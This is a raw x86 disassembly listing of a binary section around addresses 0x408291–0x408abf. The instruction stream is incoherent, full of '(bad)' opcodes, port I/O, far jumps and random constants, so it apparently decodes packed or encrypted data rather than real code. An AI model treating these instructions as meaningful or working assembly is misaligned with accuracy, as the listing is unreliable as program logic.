  408291:	mov    al,0x5
  408293:	lahf   
  408294:	add    BYTE PTR [eax+0x5a9960d6],bl
  40829a:	loopne 0x4082bf
  40829c:	rcr    BYTE PTR [ecx],0x6c
  40829f:	jb     0x408229
  4082a1:	mov    WORD PTR [edi+eiz*4-0x77],cs
  4082a5:	clc    
  4082a6:	outs   dx,DWORD PTR ds:[esi]
  4082a7:	js     0x408280
  4082a9:	sbb    BYTE PTR [ecx+ecx*4],ah
  4082ac:	dec    ebp
  4082ad:	push   esp
  4082ae:	mov    edi,0x78921473
  4082b3:	sti    
  4082b4:	sar    DWORD PTR [esi+esi*8+0x6],0x25
  4082b9:	sub    bh,dl
  4082bb:	xor    al,0x31
  4082bd:	scas   eax,DWORD PTR es:[edi]
  4082be:	(bad)  
  4082c0:	arpl   WORD PTR [edi+0x49],di
  4082c3:	push   ebx
  4082c4:	jg     0x40830f
  4082c6:	sar    DWORD PTR [edx],1
  4082c8:	inc    eax
  4082c9:	cmp    al,0xfb
  4082cb:	cmp    bl,BYTE PTR [ecx-0x4a]
  4082ce:	(bad)  [esi+0x78]
  4082d1:	fsubr  DWORD PTR [ebp-0x1f2f9940]
  4082d7:	ret    0x58da
  4082da:	push   0xffffffcb
  4082dc:	pop    esp
  4082dd:	icebp  
  4082de:	lods   al,BYTE PTR ds:[esi]
  4082df:	jo     0x40829e
  4082e1:	(bad)  
  4082e3:	mov    ebx,0x204d7b39
  4082e8:	loopne 0x4082e5
  4082ea:	fld    QWORD PTR [esp+ecx*8+0x61]
  4082ee:	loope  0x4082a4
  4082f0:	iret   
  4082f1:	and    DWORD PTR [edi],esp
  4082f3:	leave  
  4082f4:	scas   eax,DWORD PTR es:[edi]
  4082f5:	shl    cl,0x8e
  4082f8:	push   edx
  4082f9:	dec    edx
  4082fa:	out    0xe4,al
  4082fc:	ja     0x4082b3
  4082fe:	sub    DWORD PTR [ecx],ecx
  408300:	add    ebp,DWORD PTR [edx-0x65a92851]
  408306:	push   ds
  408307:	mov    WORD PTR [ebp+ecx*2-0x3c04bfb7],?
  40830e:	int3   
  40830f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408310:	(bad)  
  408312:	jne    0x408382
  408314:	push   0x7eb6103d
  408319:	lods   eax,DWORD PTR ds:[esi]
  40831a:	dec    ebp
  40831b:	mov    DWORD PTR [edx+0x1efd34d6],ecx
  408321:	xchg   ebp,eax
  408322:	clc    
  408323:	dec    edx
  408324:	push   ss
  408325:	dec    esi
  408326:	mov    edi,0x1532d19a
  40832b:	out    dx,eax
  40832c:	jns    0x4082b9
  40832e:	mov    ds:0x9cd4a5e0,eax
  408333:	ds pusha 
  408335:	add    BYTE PTR [edi+0xb],0xfe
  408339:	std    
  40833a:	jecxz  0x4082dc
  40833c:	fidiv  WORD PTR [eax]
  40833e:	lahf   
  40833f:	or     bh,BYTE PTR cs:[ebp+ebx*2+0x77d9bf7e]
  408347:	fst    DWORD PTR [eax]
  408349:	mov    eax,ds:0x424fc192
  40834e:	xor    DWORD PTR [ebx+eiz*1],edx
  408351:	popa   
  408352:	push   edx
  408354:	out    dx,al
  408355:	xchg   ecx,eax
  408356:	aaa    
  408357:	call   DWORD PTR [ebx+ebx*2+0x68]
  40835b:	test   al,0xf5
  40835d:	mov    bl,0xfc
  40835f:	(bad)  
  408360:	adc    edx,DWORD PTR [esi-0x36]
  408363:	cmp    bh,BYTE PTR [edi+ebp*2-0x1e]
  408367:	xor    esp,DWORD PTR [esi+0x37]
  40836a:	cli    
  40836b:	lds    eax,FWORD PTR [edi-0x79]
  40836e:	test   eax,0x8c9d092
  408373:	jecxz  0x40831f
  408375:	pop    ebp
  408376:	jecxz  0x4083ac
  408378:	mov    ah,0x87
  40837a:	jecxz  0x40838b
  40837c:	into   
  40837d:	xor    DWORD PTR [ebx],0xa
  408380:	and    eax,0x6f32c6da
  408385:	sbb    eax,0xf381c774
  40838a:	and    al,0x27
  40838c:	pop    ebx
  40838d:	xor    al,0x70
  40838f:	sbb    ecx,esi
  408391:	push   cs
  408392:	sbb    BYTE PTR gs:[ecx],ch
  408395:	aas    
  408396:	xor    al,0x3d
  408398:	std    
  408399:	sbb    eax,0xab794e12
  40839e:	es jb  0x40838b
  4083a1:	aas    
  4083a2:	lock jne 0x40835f
  4083a5:	push   0x1a
  4083a7:	xchg   esp,eax
  4083a8:	pop    ds
  4083a9:	and    edi,DWORD PTR [ebp+0x7b]
  4083ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083ad:	and    DWORD PTR [edi+0x746caa0c],edx
  4083b3:	dec    ecx
  4083b4:	jg     0x40838a
  4083b6:	mov    ebx,0xc4a1a8cf
  4083bb:	(bad)  
  4083bc:	test   eax,0xf76e8be
  4083c1:	sub    ebp,DWORD PTR [eax]
  4083c3:	adc    eax,DWORD PTR ds:0xe1b2b20d
  4083c9:	and    eax,0xed9d6388
  4083ce:	mov    edx,0x73e75d0d
  4083d3:	mov    al,0x61
  4083d5:	dec    eax
  4083d6:	push   eax
  4083d7:	scas   eax,DWORD PTR es:[edi]
  4083d8:	ja     0x408423
  4083da:	out    dx,eax
  4083db:	arpl   WORD PTR [ebx-0x3f],bx
  4083de:	ret    0x5d92
  4083e1:	lock xchg BYTE PTR [edx-0x4ccf5b0c],ah
  4083e8:	repnz in eax,dx
  4083ea:	xchg   esp,eax
  4083eb:	add    eax,0xbc3d592a
  4083f0:	idiv   BYTE PTR [edx]
  4083f2:	retf   0x12ad
  4083f5:	xor    ebp,DWORD PTR [eax+0x41]
  4083f8:	mov    bl,0x90
  4083fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083fb:	shl    BYTE PTR [esi-0xf],0x37
  4083ff:	imul   edi,DWORD PTR [ecx-0x282f4887],0x3a
  408406:	xor    eax,0x487bd62
  40840b:	out    dx,eax
  40840c:	in     al,0xcf
  40840e:	xchg   ecx,eax
  40840f:	mov    edx,0xc1438118
  408414:	cmp    eax,0xdabd53f0
  408419:	jg     0x408498
  40841b:	xchg   edi,eax
  40841c:	dec    edx
  40841d:	ss stos DWORD PTR es:[edi],eax
  40841f:	mov    cl,0x87
  408421:	push   0x1c
  408423:	in     al,dx
  408424:	mov    ebx,0x4d5b4b1e
  408429:	mov    eax,ds:0xb7ebdda4
  40842e:	mov    cs,edx
  408430:	jmp    0x72c59fb9
  408435:	out    0xa3,al
  408437:	and    eax,0x5c4e3c1d
  40843c:	xchg   ebx,eax
  40843d:	jge    0x408494
  40843f:	nop
  408440:	jae    0x408466
  408442:	xchg   esp,eax
  408443:	lds    edi,FWORD PTR [edi]
  408445:	scas   al,BYTE PTR es:[edi]
  408446:	cmp    DWORD PTR [ebx],edx
  408448:	fwait
  408449:	mov    ds:0x4d84cefa,eax
  40844e:	add    BYTE PTR [eax],ah
  408450:	ins    DWORD PTR es:[edi],dx
  408451:	jbe    0x408464
  408453:	mov    ebp,0xb26d379d
  408458:	in     al,0x56
  40845a:	mov    ds:0x4337a5b3,al
  40845f:	or     ecx,DWORD PTR [ebx+0x1b]
  408462:	inc    edx
  408463:	sub    al,0x61
  408465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408466:	call   0x1bff9935
  40846b:	mov    BYTE PTR [eax-0x5f],cl
  40846e:	push   ebx
  40846f:	cmp    DWORD PTR [ebx],esp
  408471:	ds aaa 
  408473:	dec    ecx
  408474:	(bad)  
  408475:	test   DWORD PTR [ebp+0x19],0xb5fbbedd
  40847c:	cmp    al,0x65
  40847e:	xor    DWORD PTR [esi],ebx
  408480:	imul   edx,DWORD PTR [esi+0x21b7a894],0x57ccd809
  40848a:	xor    DWORD PTR [edi-0x6580759c],0xffffffc5
  408491:	inc    ebp
  408492:	cld    
  408493:	xor    ebp,DWORD PTR [ebx]
  408495:	inc    esp
  408496:	lds    edi,FWORD PTR [ecx-0xf523f62]
  40849c:	stos   BYTE PTR es:[edi],al
  40849d:	neg    bh
  40849f:	out    dx,al
  4084a0:	stc    
  4084a1:	shl    DWORD PTR gs:[ebx-0x1331d38c],1
  4084a8:	adc    eax,0x9f147824
  4084ad:	rol    BYTE PTR [edi+0x446b680d],0xde
  4084b4:	mov    edi,0x397482eb
  4084b9:	cmp    edi,0xeea10f2d
  4084bf:	nop
  4084c0:	cmp    al,0xdd
  4084c2:	test   ebp,ebp
  4084c4:	sbb    dl,bh
  4084c6:	jge    0x4084de
  4084c8:	mov    ebx,0xe020a1cf
  4084cd:	lock sub ebp,DWORD PTR [si]
  4084d1:	push   edi
  4084d2:	iret   
  4084d3:	xor    BYTE PTR [ebp+0x1f],ch
  4084d6:	fwait
  4084d7:	or     bl,ch
  4084d9:	test   eax,0x4d75f0b7
  4084de:	mov    ch,0x5f
  4084e0:	inc    edi
  4084e1:	test   edx,edi
  4084e3:	jge    0x40848b
  4084e5:	and    al,0xe6
  4084e7:	cmp    esi,DWORD PTR [edi]
  4084e9:	push   edx
  4084ea:	xlat   BYTE PTR ds:[ebx]
  4084eb:	mov    ch,0x3f
  4084ed:	(bad)  
  4084ee:	in     al,0xb2
  4084f0:	pop    edx
  4084f1:	adc    DWORD PTR [esi-0x24],0xf02cbc94
  4084f8:	jo     0x408552
  4084fa:	repz sub edx,DWORD PTR [eax+0x74ba69dc]
  408501:	sar    DWORD PTR ds:0xf603f56c,0x92
  408508:	sbb    esp,DWORD PTR [edi-0x4d73c0b6]
  40850e:	pusha  
  40850f:	out    dx,al
  408510:	pop    esp
  408511:	cmp    ch,BYTE PTR [eax-0x7f0493b]
  408517:	mov    bh,0xb7
  408519:	inc    eax
  40851a:	mov    eax,0xf4cb9789
  40851f:	std    
  408520:	xor    al,0xfc
  408522:	jle    0x4085a1
  408524:	xchg   DWORD PTR [edx+ecx*1+0x7e],ecx
  408528:	(bad)
  40852d:	pop    ecx
  40852e:	push   edx
  40852f:	aaa    
  408530:	addr16 (bad) 
  408532:	repnz push edi
  408534:	sub    ebp,ecx
  408536:	mov    eax,ds:0x128e5845
  40853b:	fwait
  40853c:	mov    dl,0x22
  40853e:	and    ecx,edi
  408540:	aam    0xf0
  408542:	leave  
  408543:	xor    al,0x95
  408545:	mov    dh,0x9e
  408547:	mov    edx,0xcbc4e09e
  40854c:	push   esp
  40854d:	cwde   
  40854e:	xor    DWORD PTR [esi-0x318b332d],edi
  408554:	cmovae esp,edi
  408557:	jmp    0xe583508b
  40855c:	push   0xdef3fc90
  408561:	sahf   
  408562:	call   0xd315:0x35ec9e00
  408569:	jnp    0x408595
  40856b:	ja     0x408546
  40856d:	shr    DWORD PTR [eax+ecx*1-0x272418e0],cl
  408574:	out    0xc,eax
  408576:	arpl   WORD PTR [ebx+0x1e26bbe6],si
  40857c:	pushf  
  40857d:	repnz dec edi
  40857f:	fstp   TBYTE PTR [ecx+edi*8-0x3d1d128]
  408586:	sahf   
  408587:	inc    edx
  408588:	call   ebp
  40858a:	push   ebx
  40858b:	sub    eax,DWORD PTR [edi-0x264325d9]
  408591:	sbb    bl,BYTE PTR [ebx-0x4f]
  408594:	test   al,0x8c
  408596:	sbb    dl,0x2d
  408599:	lahf   
  40859a:	les    edx,FWORD PTR [ebx+0x3e]
  40859d:	stos   BYTE PTR es:[edi],al
  40859e:	gs sub eax,0x3eb967f4
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x3cc6bc75
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085d2
  4085c4:	int    0x8c
  4085c6:	sbb    al,0x94
  4085c8:	or     edx,DWORD PTR [esi+0x40a3d814]
  4085ce:	mov    bl,BYTE PTR [edi]
  4085d0:	jno    0x40861d
  4085d2:	push   es
  4085d3:	add    DWORD PTR [ebx-0x3c],0x4a9561c7
  4085da:	pop    edx
  4085db:	sbb    bh,BYTE PTR [ecx+0x40f4f92b]
  4085e1:	out    0x7,eax
  4085e3:	cmp    ebp,esi
  4085e5:	popa   
  4085e6:	jge    0x408601
  4085e8:	gs ret 
  4085ea:	pop    ebp
  4085eb:	xchg   esp,eax
  4085ec:	dec    edx
  4085ed:	test   BYTE PTR [ecx-0x411ee98c],dh
  4085f3:	inc    eax
  4085f4:	inc    eax
  4085f5:	ret    0x8022
  4085f8:	push   ds
  4085f9:	inc    esi
  4085fa:	rol    ebp,0xe1
  4085fd:	add    eax,0xfe2e1d5e
  408602:	hlt    
  408603:	pusha  
  408604:	push   es
  408605:	packsswb mm0,QWORD PTR [edi+0x9]
  408609:	mov    al,ds:0x64a86258
  40860e:	daa    
  40860f:	and    al,0x75
  408611:	inc    ebx
  408612:	sbb    ecx,esp
  408614:	mov    eax,ds:0x581b4528
  408619:	rcr    BYTE PTR [ecx+eiz*8-0x47305e11],cl
  408620:	loopne 0x4085a4
  408622:	inc    edx
  408623:	mov    bh,0x40
  408625:	mov    ds:0x94966a24,eax
  40862a:	mov    DWORD PTR [edx+0x72],ebx
  40862d:	mov    ds:0x467cf04a,eax
  408632:	fsubr  DWORD PTR [esi+ebp*2-0x75]
  408636:	cmp    al,0xbe
  408638:	cmp    esi,DWORD PTR [esi-0x7e75e693]
  40863e:	dec    edi
  40863f:	pusha  
  408640:	scas   eax,DWORD PTR es:[edi]
  408641:	hlt    
  408642:	stc    
  408643:	nop
  408644:	cmp    esi,DWORD PTR [edi+0x40]
  408647:	pusha  
  408648:	icebp  
  408649:	addr16 xor eax,0xac5fc188
  40864f:	ins    DWORD PTR es:[edi],dx
  408650:	hlt    
  408651:	adc    al,0x87
  408653:	sbb    ebp,DWORD PTR [ecx+0x956604c]
  408659:	aam    0xc0
  40865b:	mov    eax,DWORD PTR [edi-0x6ff51167]
  408661:	pop    ebx
  408662:	or     ch,ch
  408664:	enter  0x908b,0x17
  408668:	xchg   ebp,eax
  408669:	lock lds ecx,FWORD PTR [ebp-0x5a]
  40866d:	rol    bh,0xe3
  408670:	les    esp,FWORD PTR [eax-0x149bf870]
  408676:	test   eax,0xf74e600b
  40867b:	pop    esi
  40867c:	cmc    
  40867d:	call   0x94e8:0x6dee2f15
  408684:	mov    ecx,DWORD PTR [ebx+ecx*1]
  408687:	(bad)
  40868a:	imul   edx,DWORD PTR [ebx],0x15
  40868d:	cmp    al,0x67
  40868f:	xchg   edx,eax
  408690:	rol    esi,cl
  408692:	sti    
  408693:	imul   eax,edi,0x634a1420
  408699:	mov    ecx,0xdf9fc11
  40869e:	add    eax,0x7e83c011
  4086a3:	call   0xea8f796b
  4086a8:	dec    ebp
  4086a9:	dec    ebp
  4086aa:	shl    bl,cl
  4086ac:	clc    
  4086ad:	call   0xfad7:0x7527f00a
  4086b4:	mov    al,ds:0x4d308100
  4086b9:	jne    0x4086e9
  4086bb:	loopne 0x40863e
  4086bd:	push   ss
  4086be:	scas   al,BYTE PTR es:[edi]
  4086bf:	or     edx,DWORD PTR [ebp+0x2a]
  4086c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086c3:	clc    
  4086c4:	mov    eax,0x3713f856
  4086c9:	add    cl,cl
  4086cb:	pop    edi
  4086cc:	add    BYTE PTR [esi+0x71],cl
  4086cf:	jno    0x408725
  4086d1:	shl    BYTE PTR ds:0x315db56a,1
  4086d7:	mov    ebx,0x51ca1a82
  4086dc:	pop    eax
  4086dd:	lods   al,BYTE PTR ds:[esi]
  4086de:	addr16 cld 
  4086e0:	pop    edx
  4086e1:	ror    BYTE PTR [edx+0x6de31697],cl
  4086e7:	push   0xffffffb6
  4086e9:	lods   eax,DWORD PTR ds:[esi]
  4086ea:	and    BYTE PTR fs:[ebp-0x56],bl
  4086ee:	ja     0x408717
  4086f0:	adc    BYTE PTR [ebx+eiz*2],cl
  4086f3:	fist   DWORD PTR [esi-0x55]
  4086f6:	xchg   ebp,eax
  4086f7:	icebp  
  4086f8:	add    eax,0xcbbbb11f
  4086fd:	sub    dl,al
  4086ff:	mov    esi,0x6316ad4e
  408704:	push   ecx
  408705:	out    0x48,al
  408707:	xor    al,0x8e
  40870a:	mov    eax,ds:0x32504d2a
  40870f:	out    0x82,al
  408711:	adc    BYTE PTR [edi+0x21],bl
  408714:	fisttp WORD PTR [ebp-0x2a5c8185]
  40871a:	jmp    0x408714
  40871c:	push   ebx
  40871d:	dec    edi
  40871e:	mov    ecx,0xf7e5d996
  408723:	mov    bh,BYTE PTR [edx-0x62]
  408726:	pusha  
  408727:	push   esp
  408728:	repz test eax,0x5fe2fc39
  40872e:	fcomp  DWORD PTR [edx+0x33a9b411]
  408734:	test   ah,bh
  408736:	mov    ecx,0x25e438be
  40873b:	test   eax,0xa573821d
  408740:	fisub  DWORD PTR [ebx-0x15dfb7de]
  408746:	jmp    0x26913060
  40874b:	xchg   ebp,eax
  40874c:	shl    BYTE PTR [ecx-0x4801cdc9],1
  408752:	imul   edx,DWORD PTR [esi],0x7
  408755:	inc    ebx
  408756:	add    BYTE PTR [ecx+edi*4],al
  408759:	aad    0x6
  40875b:	mov    edi,0x10a1bc96
  408760:	out    dx,eax
  408761:	cs push 0x2d
  408764:	out    dx,eax
  408765:	jmp    0xb5ce0f02
  40876a:	dec    eax
  40876b:	xor    DWORD PTR [edi-0xf69f707],0x7430c657
  408775:	stos   BYTE PTR es:[edi],al
  408776:	pop    eax
  408777:	out    dx,al
  408778:	mov    edx,0x186c13ac
  40877d:	jl     0x408791
  40877f:	xor    BYTE PTR [ebx],0x34
  408782:	pushf  
  408783:	inc    esi
  408784:	ja     0x4087db
  408786:	xor    eax,0x1eac9cc0
  40878b:	and    bh,BYTE PTR [edi]
  40878d:	test   eax,0x42a56c2c
  408792:	pop    esi
  408793:	jmp    0x1a3c3c5
  408798:	pushf  
  408799:	dec    esi
  40879a:	in     eax,0xab
  40879c:	cs jl  0x408774
  40879f:	add    edi,DWORD PTR [esi+0x381fc2ab]
  4087a5:	fistp  WORD PTR [eax+0x51]
  4087a8:	mov    al,dl
  4087aa:	sbb    DWORD PTR [edi+0x4b],esi
  4087ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ae:	adc    eax,esi
  4087b0:	mov    DWORD PTR [ebp+0x6f],eax
  4087b3:	sbb    eax,DWORD PTR fs:[ebp+0x3c]
  4087b7:	mov    eax,ds:0x58b41a19
  4087bc:	test   eax,0x733c1036
  4087c1:	int    0xb3
  4087c3:	mov    esp,0x7d7e5c6f
  4087c8:	mov    ebx,0xca7540f9
  4087cd:	test   DWORD PTR [ebx],ebx
  4087cf:	cmp    eax,0x88ec79b5
  4087d4:	push   ss
  4087d5:	ja     0x408768
  4087d7:	int3   
  4087d8:	(bad)  [esi-0x35695623]
  4087de:	pop    edi
  4087df:	cmp    dh,ah
  4087e1:	mov    bl,BYTE PTR [edi+0x1ddb4050]
  4087e7:	aad    0x8b
  4087e9:	mov    BYTE PTR [esi],0xe0
  4087ec:	es jl  0x4087c5
  4087ef:	enter  0xd3e8,0x8
  4087f3:	xor    al,0xc5
  4087f5:	je     0x4087c5
  4087f7:	les    ebp,FWORD PTR [edx-0x42]
  4087fa:	scas   eax,DWORD PTR es:[edi]
  4087fb:	push   edi
  4087fc:	scas   al,BYTE PTR es:[edi]
  4087fd:	mov    al,0x9
  4087ff:	aad    0x87
  408801:	in     eax,0xa6
  408803:	fldcw  WORD PTR [ebx-0x64]
  408806:	or     ch,bl
  408808:	pop    es
  408809:	and    BYTE PTR [esi-0x70],ch
  40880c:	arpl   si,dx
  40880e:	cmp    ecx,esi
  408810:	lea    esi,[esi+0x274a40e6]
  408816:	push   eax
  408817:	push   eax
  408818:	jns    0x40884b
  40881a:	add    BYTE PTR [edx],ah
  40881c:	jbe    0x408889
  40881e:	xchg   esp,eax
  40881f:	push   es
  408820:	hlt    
  408821:	cmp    BYTE PTR [ebx],0x12
  408824:	sub    DWORD PTR [eax],eax
  408826:	loop   0x408801
  408828:	or     al,0x85
  40882a:	cmc    
  40882b:	leave  
  40882c:	inc    esi
  40882d:	jg     0x40880b
  40882f:	add    al,ah
  408831:	repnz xor BYTE PTR [esi-0x574eb64e],bl
  408838:	push   edi
  408839:	cs inc ebx
  40883b:	ja     0x408846
  40883d:	sbb    bl,BYTE PTR [esi-0x14]
  408840:	fmul   st,st(4)
  408842:	nop
  408843:	je     0x408872
  408845:	ret    
  408846:	adc    DWORD PTR cs:[ebp-0x2772296e],0x4428e315
  408851:	ret    0xb5
  408854:	scas   eax,DWORD PTR es:[edi]
  408855:	pop    ss
  408856:	mov    bh,BYTE PTR [ecx-0x15]
  408859:	mov    DWORD PTR [ecx+0x4c],ecx
  40885c:	(bad)  
  40885d:	jo     0x4088bc
  40885f:	add    edx,ebx
  408861:	cli    
  408862:	repz lock sbb eax,0x9c0a9160
  408869:	mov    ds:0xaaf1fc0,eax
  40886e:	cmc    
  40886f:	imul   edx,DWORD PTR [ebp+0x6d],0x12
  408873:	ins    BYTE PTR es:[edi],dx
  408874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408875:	clc    
  408876:	lahf   
  408877:	jle    0x40888a
  408879:	push   esi
  40887a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40887b:	jnp    0x408892
  40887d:	fsub   QWORD PTR [edx+0x3c6d5aed]
  408883:	(bad)  
  408884:	jp     0x408819
  408886:	aaa    
  408887:	lds    esi,FWORD PTR [ecx]
  408889:	jo     0x40889b
  40888b:	outs   dx,BYTE PTR ds:[esi]
  40888c:	mov    ch,0x46
  40888e:	idiv   cl
  408890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408891:	shr    DWORD PTR [eax+0x1c106ab9],cl
  408897:	pop    ebx
  408898:	xor    eax,DWORD PTR [edi]
  40889a:	arpl   WORD PTR [edi-0x6de3c109],bp
  4088a0:	rol    DWORD PTR [eax-0x45],0x5e
  4088a4:	loope  0x4088f8
  4088a6:	cmp    eax,0xe4297dc8
  4088ab:	add    eax,0xe3ed1889
  4088b0:	dec    esi
  4088b1:	jle    0x408908
  4088b3:	and    DWORD PTR [ebx-0x6ea600f8],0xa31b9ad3
  4088bd:	push   edx
  4088be:	add    DWORD PTR [eax+0x71],0x62
  4088c2:	in     eax,dx
  4088c3:	rcr    BYTE PTR [edi-0x58],0xc7
  4088c7:	hlt    
  4088c8:	and    eax,0xe29868ee
  4088cd:	lea    esp,[ecx+0x4]
  4088d0:	mov    ?,WORD PTR [esi-0xc]
  4088d3:	(bad)  [ebp+0x3198d4d1]
  4088d9:	jmp    0x2e28:0x7ba78409
  4088e0:	aad    0x30
  4088e2:	fcomp  DWORD PTR ds:0xd94eef2f
  4088e8:	pop    ds
  4088e9:	and    eax,0xec832b79
  4088ee:	retf   0x7af5
  4088f1:	in     eax,0x92
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x74435cff],cl
  40890c:	mov    ecx,0xdc97e86a
  408911:	jo     0x408983
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408938
  408918:	jne    0x408983
  40891a:	inc    ecx
  40891b:	loope  0x408976
  40891d:	jl     0x408963
  40891f:	ds (bad) 
  408921:	fiadd  WORD PTR [eax]
  408923:	loop   0x408924
  408925:	and    DWORD PTR [eax+0x35],esp
  408928:	out    0x9e,al
  40892a:	mov    ds:0x6d18a1d0,eax
  40892f:	cmp    esp,DWORD PTR [ebx]
  408931:	adc    BYTE PTR [edi-0x39048ee9],cl
  408937:	push   ecx
  408938:	out    dx,eax
  408939:	(bad)  
  40893a:	pop    ebx
  40893c:	jp     0x408937
  40893e:	mov    DWORD PTR [edi-0x34],esi
  408941:	mov    bl,0x1c
  408943:	ds icebp 
  408945:	(bad)  
  408946:	adc    eax,0x3189cc40
  40894b:	and    DWORD PTR [ecx+eax*8],edx
  40894e:	jo     0x408995
  408950:	addr16 shl ecx,cl
  408953:	ret    
  408954:	inc    ecx
  408955:	das    
  408956:	push   0x58
  408958:	xchg   edi,eax
  408959:	xchg   edi,eax
  40895a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40895b:	fcom   DWORD PTR ds:0x519d29e2
  408961:	push   ebx
  408962:	adc    bl,dl
  408964:	pop    esp
  408965:	imul   esp,esp,0x6e03b9ea
  40896b:	mov    ds:0xe6a8773a,al
  408970:	les    esi,FWORD PTR ds:0x4d5e0fb
  408976:	mov    eax,ds:0x28707f73
  40897b:	cld    
  40897c:	mov    WORD PTR [edi*2-0x61b2388f],?
  408983:	jmp    0x4510:0x1dd7fdd1
  40898a:	ds scas eax,DWORD PTR es:[edi]
  40898c:	fisttp QWORD PTR [ebp-0x56]
  40898f:	mov    esi,0x9a16018
  408994:	push   ebx
  408995:	push   eax
  408996:	shl    DWORD PTR [edx+0x4d9ea12d],1
  40899c:	fwait
  40899d:	xchg   BYTE PTR [edi-0x537c2a0d],ch
  4089a3:	jmp    0x4089d3
  4089a5:	out    dx,al
  4089a6:	fist   DWORD PTR [edi-0x3b]
  4089a9:	xor    BYTE PTR [esi],dl
  4089ab:	aad    0xb7
  4089ad:	aaa    
  4089ae:	and    BYTE PTR [ecx-0x1a],dl
  4089b1:	jg     0x40898f
  4089b3:	fwait
  4089b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089b5:	xchg   DWORD PTR cs:[eax-0x40234480],edi
  4089bc:	push   edx
  4089bd:	ss int 0x9b
  4089c0:	mov    ebp,0x60aed713
  4089c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c6:	retf   0x8b59
  4089c9:	mov    cs,WORD PTR [esi-0x726fb01f]
  4089cf:	push   ss
  4089d0:	jne    0x4089c1
  4089d2:	xchg   DWORD PTR [esi],edx
  4089d4:	jnp    0x408a0d
  4089d6:	imul   DWORD PTR [eax+0x599987de]
  4089dc:	xor    BYTE PTR [edi+eiz*8-0x3840dae],bh
  4089e3:	sahf   
  4089e4:	inc    ecx
  4089e5:	sub    eax,0x98ac3860
  4089ea:	adc    ebp,eax
  4089ec:	test   DWORD PTR [ecx],esp
  4089ee:	dec    ecx
  4089ef:	aam    0x54
  4089f1:	inc    esp
  4089f2:	mov    eax,0x7d793173
  4089f7:	dec    esi
  4089f8:	std    
  4089f9:	inc    esi
  4089fa:	jecxz  0x4089c1
  4089fc:	mov    bh,0x25
  4089fe:	outs   dx,BYTE PTR ds:[esi]
  4089ff:	mov    bl,dl
  408a01:	dec    eax
  408a02:	cs clc 
  408a04:	hlt    
  408a05:	or     DWORD PTR [edx],ecx
  408a07:	test   al,0x39
  408a09:	dec    eax
  408a0a:	sub    BYTE PTR [ecx-0x64fa47b7],al
  408a10:	repz sub eax,0xc3142998
  408a16:	out    0x94,al
  408a18:	lods   al,BYTE PTR ds:[esi]
  408a19:	outs   dx,BYTE PTR ds:[esi]
  408a1a:	xchg   ebp,eax
  408a1b:	mov    al,ds:0x2bc07ee7
  408a20:	mov    DWORD PTR [ebx],eax
  408a22:	je     0x4089b0
  408a24:	or     eax,edi
  408a26:	push   esi
  408a27:	clc    
  408a28:	pushf  
  408a29:	into   
  408a2a:	sbb    bh,BYTE PTR [edi-0x53]
  408a2d:	popa   
  408a2e:	les    edi,FWORD PTR [esi-0x398e0986]
  408a34:	or     ecx,DWORD PTR [ebp+0x70458fe]
  408a3a:	sbb    BYTE PTR [eax+ebp*8+0xd],ah
  408a3e:	dec    ecx
  408a3f:	mov    ebx,0xaf1764e3
  408a44:	cld    
  408a45:	inc    eax
  408a46:	lea    ebp,[edi]
  408a48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a49:	xchg   esp,eax
  408a4a:	add    al,0x5
  408a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a4e:	repnz mov esi,0xc8fd690
  408a54:	adc    eax,0xca5a1937
  408a59:	xchg   DWORD PTR ds:[edi+eax*8+0x4],edx
  408a5e:	imul   eax,DWORD PTR [edx+0x316c144],0x8fe21365
  408a68:	stos   BYTE PTR es:[edi],al
  408a69:	jbe    0x408a60
  408a6b:	rol    DWORD PTR [ecx+0x672bd24],1
  408a71:	inc    edi
  408a72:	jmp    0x737808ab
  408a77:	lock sbb al,al
  408a7a:	stos   BYTE PTR es:[edi],al
  408a7b:	sbb    ebx,edx
  408a7d:	daa    
  408a7e:	popf   
  408a7f:	push   ebp
  408a80:	dec    edx
  408a81:	pop    eax
  408a82:	fwait
  408a83:	mov    esp,0xb0852586
  408a88:	ud2    
  408a8a:	enter  0x1398,0x30
  408a8e:	adc    eax,0x4cdf6ce6
  408a93:	push   ebx
  408a94:	mov    DWORD PTR [ebx-0xe430f17],ecx
  408a9a:	adc    BYTE PTR ds:0x3b6b27a5,cl
  408aa0:	xor    DWORD PTR [edi+0x60bae10],ebx
  408aa6:	popa   
  408aa7:	xchg   ebp,eax
  408aa8:	popa   
  408aa9:	xchg   BYTE PTR [esi+edi*4],al
  408aac:	je     0x408a6b
  408aae:	out    dx,al
  408aaf:	dec    edx
  408ab0:	addr16 sti 
  408ab2:	mov    ecx,0xb0b1897
  408ab7:	mov    cl,BYTE PTR [ebx-0x1e]
  408aba:	jno    0x408b35
  408abc:	jg     0x408ae5
  408abe:	inc    ebx
  408abf:	sbb    DWORD PTR [ebx],edi
